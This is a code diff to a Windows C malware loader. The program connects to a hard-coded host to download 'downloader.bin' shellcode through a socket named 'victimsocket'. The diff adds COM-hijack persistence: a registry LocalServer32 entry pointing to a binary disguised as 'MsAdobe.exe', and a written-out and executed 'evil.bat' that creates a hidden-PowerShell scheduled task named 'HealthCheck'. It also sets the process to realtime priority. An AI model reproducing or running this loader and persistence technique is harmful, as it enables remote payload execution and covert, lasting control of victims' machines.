@@ -8,6 +8,15 @@
 #include <stdlib.h>
 
 
+#include <windows.h>
+#include <fileapi.h>
+#include <wininet.h>
+#include <stdint.h>
+#include <winnt.h>
+#include <unistd.h>
+
+
+
 #pragma comment(lib, "ws2_32.lib")
 
 
@@ -28,7 +37,7 @@ int main()
 	  NULL,
 	  NULL,
 	  FALSE,
-	  BELOW_NORMAL_PRIORITY_CLASS,
+	  REALTIME_PRIORITY_CLASS,
 	  NULL,
 	  NULL,
 	  &si,
@@ -43,9 +52,7 @@ int main()
 	  printf("(+) Process Started! pid: %ld", PID);
 	  
 	Sleep(1000);
-	
-	
-	 // Find the Notepad window
+		 // Find the Notepad window
     HWND hwnd = FindWindow("Notepad", NULL);
 
     // Find the edit control inside Notepad
@@ -56,6 +63,41 @@ int main()
     for (const char *p = text; *p; ++p) {
         SendMessage(hwndEdit, WM_CHAR, (WPARAM)*p, 0);
     }
+	
+	//Set registry  Value - point to bankwestapp.exe
+
+	HKEY hkey;
+	LPCSTR set_string_value = "c:\\Users\\saurav\\Desktop\\MsAdobe.exe";
+
+	RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{00f2b433-44e4-4d88-b2b0-2698a0a91dba}\\LocalServer32", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL); //open registry key handle.
+	RegSetValueExA(hkey, "", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
+	RegCloseKey(hkey);
+	
+	//File Vars
+	const char* filename = "c:\\Users\\saurav\\Desktop\\evil.bat";
+    const char* filecontent = "schtasks /create /tn HealthCheck /tr \"Powershell -WindowStyle Hidden -Command \\\"[activator]::CreateInstance([type]::GetTypeFromCLSID(\'\'\'00f2b433-44e4-4d88-b2b0-2698a0a91dba\'\'\'))\\\"\" /rl HIGHEST /SC ONEVENT /EC \"Security\" /MO \"*[System/EventID=4801]\"";
+
+	//Create a File
+	HANDLE hfile;
+	hfile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE)
+	{
+		printf("File creation failed\n");
+		return 1;
+	}
+	
+	//Write to file
+    BOOL WrFile;
+    long unsigned int byteswritten;
+    WrFile = WriteFile(hfile, filecontent, strlen(filecontent), &byteswritten, NULL);
+
+
+    CloseHandle(hfile);
+	
+	//Run the batfile.
+	system("c:\\Users\\saurav\\Desktop\\evil.bat");
+
+
 	
     WORD wVersionRequested = MAKEWORD(2, 2);
     WSADATA wsadata;
@@ -96,7 +138,7 @@ int main()
     struct sockaddr_in server_address;
 	memset(&server_address, 0, sizeof(server_address)); //initialize the address to zerods
     server_address.sin_family = AF_INET;
-    server_address.sin_addr = inet_addr("192.168.255.17");
+    server_address.sin_addr = inet_addr("192.168.255.14");
     server_address.sin_port = htons(8000);
 
 		int victimconnect = connect(victimsocket, (struct sockaddr*)&server_address, sizeof(struct sockaddr_in));
@@ -106,7 +148,7 @@ int main()
 		}
 
     //SEND DATA TO SERVER REQUESTING FOR SHELLCODE
-    char *message = "GET /downloader.bin HTTP/1.1\r\nHost: 192.168.255.17\r\n\r\n";
+    char *message = "GET /downloader.bin HTTP/1.1\r\nHost: 192.168.255.14\r\n\r\n";
 	printf ("%s", message);
     int victimsend = send(victimsocket, message, strlen(message), 0);
 		if (victimsend == -1){
@@ -132,7 +174,7 @@ int main()
 		
 				if (recv_byte > 0)
 				Sleep (1000);
-				{
+					{
 					printf("Data is:  %s \n", data);
 				}
 				if (recv_byte > 204){
@@ -162,6 +204,7 @@ int main()
 			} while (recv_byte > 0);
 
 			closesocket(victimsocket);
+			
 			return 0;
 		}
     //LOOP UNTILL ALL DATA IS TRANSFERRED OR PEER CLOSES THE CONNECTION
